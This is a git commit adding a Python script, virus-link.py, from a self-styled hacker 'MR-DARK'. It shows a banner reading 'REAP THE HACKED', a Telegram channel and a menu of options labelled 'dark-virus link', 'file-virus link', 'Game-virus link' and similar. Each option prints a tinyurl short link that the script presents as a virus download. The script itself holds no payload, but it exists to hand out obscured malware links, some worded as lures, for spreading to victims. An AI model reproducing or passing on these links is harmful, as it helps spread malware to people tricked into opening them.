d1cee3aa839f3133213a124fb34212319212218c
MR-DARK15 <144409542+MR-DARK15@users.noreply.github.com>
2023-09-23 23:44:50 +0330

    Add files via upload

---
+++ virus-link.py
@@ -0,0 +1,71 @@
+from colorama import Fore
+from os import system
+from time import sleep
+sleep(1)
+print("")
+system("clear")
+print("")
+
+print(Fore.LIGHTGREEN_EX+"""
+,____
+                      |---.\\
+              ___     |    `      MR - DARK
+             / .-\  ./=)
+            |  |"|_/\/|
+            ;  |-;| /_|         REAP THE HACKED
+           / \_| |/ \ |
+          /      \/\( |
+          |   /  |` ) |
+          /   \ _/    |
+         /--._/  \    |
+         `/|)    |    /
+           /     |   |
+         .'      |   |
+        /         \  |
+       (_.-.__.__./  /
+
+""")
+print("")
+print(Fore.LIGHTGREEN_EX+"code by: "+Fore.LIGHTCYAN_EX+"MR - DARK")
+print(Fore.LIGHTGREEN_EX+"chaneel Telegram: "+Fore.LIGHTCYAN_EX+"https://t.me/MR_DARK_Teem")
+print(Fore.LIGHTGREEN_EX+"Version: "+Fore.LIGHTCYAN_EX+"1.0")
+print("")
+print(Fore.LIGHTRED_EX+"["+Fore.LIGHTGREEN_EX+"1"+Fore.LIGHTRED_EX+"]"+Fore.LIGHTRED_EX+" 𝗱𝗮𝗿𝗸-𝘃𝗶𝗿𝘂𝘀 𝗹𝗶𝗻𝗸"+Fore.LIGHTGREEN_EX+"("+Fore.LIGHTWHITE_EX+"𝘃𝗶𝗿𝘂𝘀"+Fore.LIGHTGREEN_EX+")")
+print(Fore.LIGHTRED_EX+"["+Fore.LIGHTGREEN_EX+"2"+Fore.LIGHTRED_EX+"]"+" 𝗮𝗻𝘁𝗶-𝘃𝗶𝗿𝘂𝘀 𝗹𝗶𝗻𝗸 "+Fore.LIGHTGREEN_EX+"("+Fore.LIGHTWHITE_EX+"𝘃𝗶𝗿𝘂𝘀"+Fore.LIGHTGREEN_EX+")")
+print(Fore.LIGHTRED_EX+"["+Fore.LIGHTGREEN_EX+"3"+Fore.LIGHTRED_EX+"]"+" 𝗳𝗶𝗹𝗲-𝘃𝗶𝗿𝘂𝘀 𝗹𝗶𝗻𝗸 "+Fore.LIGHTGREEN_EX+"("+Fore.LIGHTWHITE_EX+"𝘃𝗶𝗿𝘂𝘀"+Fore.LIGHTGREEN_EX+")")
+print(Fore.LIGHTRED_EX+"["+Fore.LIGHTGREEN_EX+"4"+Fore.LIGHTRED_EX+"]"+" 𝗚𝗮𝗺𝗲-𝘃𝗶𝗿𝘂𝘀 𝗹𝗶𝗻𝗸 "+Fore.LIGHTGREEN_EX+"("+Fore.LIGHTWHITE_EX+"𝘃𝗶𝗿𝘂𝘀"+Fore.LIGHTGREEN_EX+")")
+print(Fore.LIGHTRED_EX+"["+Fore.LIGHTGREEN_EX+"5"+Fore.LIGHTRED_EX+"]"+" 𝘀𝗲𝗲𝗻𝘇𝗮𝗻-𝘃𝗶𝗿𝘂𝘀 𝗹𝗶𝗻𝗸 "+Fore.LIGHTGREEN_EX+"("+Fore.LIGHTWHITE_EX+"𝘃𝗶𝗿𝘂𝘀"+Fore.LIGHTGREEN_EX+")")
+print(Fore.LIGHTRED_EX+"["+Fore.LIGHTGREEN_EX+"00"+Fore.LIGHTRED_EX+"]"+"𝗘𝘅𝗶𝘁")
+print("")
+name = input(Fore.LIGHTRED_EX+"["+Fore.LIGHTGREEN_EX+"+"+Fore.LIGHTRED_EX+"]"+Fore.LIGHTGREEN_EX+" 𝘁𝘆𝗽𝗲 𝗻𝘂𝗺𝗯𝗲𝗿𝘀"+Fore.LIGHTYELLOW_EX+" = "+Fore.LIGHTRED_EX+"𝘂𝘀𝗲𝗿 "+Fore.LIGHTYELLOW_EX+"> ")
+print("")
+
+if name == "1":
+  sleep(2)
+  print(Fore.LIGHTYELLOW_EX+"link"+Fore.LIGHTRED_EX+"-: "+Fore.LIGHTGREEN_EX+"https://tinyurl.com/Uploading-dark")
+  print("")
+  exit()
+  
+if name == "2":
+  sleep(2)
+  print(Fore.LIGHTYELLOW_EX+"link"+Fore.LIGHTRED_EX+"-: "+Fore.LIGHTGREEN_EX+"https://tinyurl.com/anti-upload")
+  print("")
+  exit()
+  
+if name == "3":
+  sleep(2)
+  print(Fore.LIGHTYELLOW_EX+"link"+Fore.LIGHTRED_EX+"-: "+Fore.LIGHTGREEN_EX+"https://tinyurl.com/Upload-filename")
+  print("")
+  exit()
+  
+if name == "4":
+  sleep(2)
+  print(Fore.LIGHTYELLOW_EX+"link"+Fore.LIGHTRED_EX+"-: "+Fore.LIGHTGREEN_EX+"https://tinyurl.com/game-play-xxx")
+  print("")
+  exit()
+  
+if name == "5":
+  sleep(2)
+  print(Fore.LIGHTYELLOW_EX+"link"+Fore.LIGHTRED_EX+"-: "+Fore.LIGHTGREEN_EX+"https://tinyurl.com/seen-zan")
+  print("")
+  exit()
